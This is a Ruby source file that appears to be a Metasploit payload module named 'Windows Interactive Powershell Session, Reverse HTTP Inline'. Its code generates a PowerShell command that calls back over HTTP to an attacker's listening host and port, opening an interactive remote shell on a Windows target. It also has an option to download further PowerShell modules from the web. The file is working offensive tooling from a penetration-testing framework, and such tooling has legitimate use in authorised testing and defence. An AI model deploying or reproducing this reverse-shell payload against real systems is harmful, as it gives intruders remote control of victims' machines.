##
# This module requires Metasploit: http://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

require 'msf/core'
require 'msf/core/handler/reverse_http'
require 'msf/core/payload/windows/powershell'
require 'msf/base/sessions/powershell'
require 'msf/core/payload/uuid/options'
require 'msf/core/payload/transport_config'
require 'msf/core/payload/windows/meterpreter_loader'
require 'msf/base/sessions/meterpreter_x86_win'
require 'msf/base/sessions/meterpreter_options'
require 'rex/payloads/meterpreter/config'

module Metasploit4

  CachedSize = 1526

  include Msf::Payload::Windows::Exec
  include Msf::Payload::Windows::Powershell
  include Rex::Powershell::Command
  include Msf::Payload::UUID::Options
  include Msf::Payload::TransportConfig
  include Msf::Payload::Windows
  include Msf::Payload::Single
  include Msf::Payload::Windows::MeterpreterLoader
  include Msf::Sessions::MeterpreterOptions

  def initialize(info = {})
    super(update_info(info,
      'Name'          => 'Windows Interactive Powershell Session, Reverse HTTP Inline',
      'Description'   => 'Listen for a connection and spawn an interactive powershell session over HTTP',
      'Author'        =>
        [
          'Ben Turner', # benpturner
          'Dave Hardy' # davehardy20
        ],
      'License'       => MSF_LICENSE,
      'Platform'      => 'win',
      'Arch'          => ARCH_X86,
      'Handler'       => Msf::Handler::ReverseHttp,
      'Session'       => Msf::Sessions::Meterpreter_x86_Win,
      ))

    # Register command execution options
    register_options(
      [
        OptString.new('LOAD_MODULES', [ false, "A list of powershell modules seperated by a comma to download over the web", nil ]),
      ], self.class)
    # Hide the CMD option...this is kinda ugly
    deregister_options('CMD')
  end

  def command_string
    # Default URL length is 30-256 bytes
    uri_req_len = 30 + rand(256-30)

    url = "http://#{datastore["LHOST"]}:#{datastore["LPORT"]}/"
    url << generate_uri_uuid_mode(:init_powershell, uri_req_len)
    print_good(url)
    generate_powershell_code("ReverseHttp", url)
  end

end
